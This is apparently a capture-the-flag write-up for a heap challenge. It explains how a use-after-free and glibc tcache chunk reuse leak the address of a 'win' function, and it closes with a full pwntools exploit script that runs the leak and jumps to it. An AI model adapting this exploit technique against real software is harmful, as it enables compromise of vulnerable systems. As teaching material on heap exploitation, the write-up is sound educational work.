Program Flow

This program shows a menu with the following options:

  1. Create a chunk of 0x20 at an index and write data
  2. Show the first 8 bytes of a chunk
  3. Free a chunk, but doesn’t clear its reference from the indices (UAF!)
  4. Jump to a memory address
  5. Exit the program
  6. Secret Function: Allocates a chunk of 0x20 and writes the address of win

The final goal is very clear here: get the address of win to jump to with jump. And to get that address we need to control the chunk allocated by secret. How can we do this?

Use After Free

The key is that when we free a chunk its reference is not cleared from the indices. When we call free() on a small chunk (like one of size 0x20), glibc doesn’t immediately return it to the system, but instead stores it in a structure called the tcache (thread cache).

The tcache works like a stack (LIFO, Last In First Out). This means the last freed chunk of a given size will be the first to be reused in a subsequent malloc call of the same size.

In practice, this means that if we free a chunk and then do another malloc of the same size, we’ll get exactly that same chunk back.

More information about the tcache:

  • https://ir0nstone.gitbook.io/notes/binexp/heap/the-tcache
  • https://guyinatuxedo.github.io/29-tcache/tcache_explanation/index.html

Exploitation Strategy

The exploitation strategy will be:

  1. Create a chunk (no need to write data).
  2. Free that chunk.
  3. Call the secret function so that when malloc() is called it reuses that chunk and writes the address of win.
  4. Show the data of our previous chunk, so it shows us the address of win.
  5. Jump to win.

from pwn import *

p = process("./chall")

def create(idx, data):
    idx = str(idx).encode()
    p.sendline(b"1")
    p.sendline(idx)
    p.recvuntil(b"Data: ")
    p.sendline(data)

def secret():
    p.sendline(b"6")

def free(idx):
    idx = str(idx).encode()
    p.sendline(b"3")
    p.sendline(idx)

def getaddr(idx):
    idx = str(idx).encode()
    p.sendline(b"2")
    p.sendline(idx)
    p.recvuntil(b"Data: ")
    addr = p.recvline()[:-1]
    return addr

def jump(addr):
    p.sendline(b"4")
    p.sendline(addr)

create(1, b"A")
free(1)
secret()
win = getaddr(1)
jump(win)
p.interactive()
